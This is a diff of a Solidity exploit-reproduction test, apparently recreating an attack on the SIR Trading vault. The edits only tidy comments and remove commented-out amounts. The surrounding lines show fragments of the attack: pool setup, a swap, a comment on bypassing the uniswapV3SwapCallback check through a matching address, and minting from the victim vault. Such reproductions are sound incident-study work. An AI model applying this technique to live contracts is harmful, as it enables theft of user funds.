@@ -71,7 +71,7 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
         positionManager.createAndInitializePoolIfNecessary(
             address(tokenB),
             address(this),
-            100, // Fee tier 0,01%
+            100, // Fee tier
             79228162514264337593543950336 // Initial sqrt price (Q64.96 format, corresponds to 1:1 ratio)
         );
 
@@ -98,7 +98,7 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
             })
         );
 
-         // Approve swap router to spend tokenA
+        // Approve swap router to spend tokenA
         IERC20(address(this)).approve(address(swapRouter), type(uint256).max);
 
         // Swap tokenB for tokenA using the Uniswap router
@@ -142,8 +142,6 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
         // safeguarding the uniswapV3SwapCallback function. We need to find an address that has the same value and
         // then call the uniswapV3SwapCallback function directly.
         console.log('===== STEP 5: Mint APE tokens =====');
-        //uint256 amountToDeposit = 139650998347915452795864661928406629; // Original Amount to deposit in the vault
-        //uint256 amountToDeposit = 10 * 10**18; // Amount to deposit in the vault
         uint256 tokensMinted = victim.mint(
             true, // isAPE
             vaultParams,
